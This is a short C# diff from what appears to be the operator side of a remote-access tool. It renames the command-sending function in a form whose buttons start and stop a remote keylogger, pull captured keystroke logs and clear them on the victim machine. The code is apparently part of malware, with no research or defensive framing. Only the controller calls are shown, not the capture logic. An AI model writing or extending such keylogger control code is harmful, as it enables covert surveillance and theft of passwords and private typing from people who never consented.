@@ -19,7 +19,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("KEYBASLAT", "[VERI][0x09]", sock);
+                MainWindow.GoToOurSocket("KEYBASLAT", "[VERI][0x09]", sock);
                 button1.Enabled = false; button2.Enabled = true;
             }
             catch (Exception) { }
@@ -29,7 +29,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("KEYDUR", "[VERI][0x09]", sock);
+                MainWindow.GoToOurSocket("KEYDUR", "[VERI][0x09]", sock);
                 button1.Enabled = true; button2.Enabled = false;
             }
             catch (Exception) { }
@@ -41,7 +41,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("KEYCEK", "[VERI]" + comboBox1.SelectedItem.ToString() + "[VERI][0x09]", sock);
+                    MainWindow.GoToOurSocket("KEYCEK", "[VERI]" + comboBox1.SelectedItem.ToString() + "[VERI][0x09]", sock);
                 }
                 catch (Exception) { }
             }
@@ -51,7 +51,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("LOGTEMIZLE", "[VERI][0x09]", sock);
+                MainWindow.GoToOurSocket("LOGTEMIZLE", "[VERI][0x09]", sock);
                 comboBox1.Items.Clear();
             }
             catch (Exception) { }
